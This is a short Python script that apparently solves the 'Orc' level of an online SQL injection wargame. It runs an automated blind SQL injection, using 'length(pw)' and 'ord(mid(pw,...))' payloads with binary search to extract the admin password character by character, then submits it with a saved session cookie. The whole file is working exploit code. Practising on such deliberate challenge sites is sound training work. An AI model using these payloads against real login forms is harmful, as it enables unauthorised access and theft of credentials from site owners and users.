#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Orc

    query : select id from prob_goblin where id='guest' and no=
    '''

    url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    payload = "' or length(pw)>%s #"
    len_of_key = los.find_key_len(url, payload, 'pw', 'Hello admin', cook)

    print(len_of_key)

    payload = "' or id='admin' and ord(mid(pw,%s,1))%s #"
    result = los.find_binary(url, payload,
                             'pw', 'Hello admin', 32, 127, len_of_key, cook)

    print(result)

    param = dict(pw=result)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('ORC Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
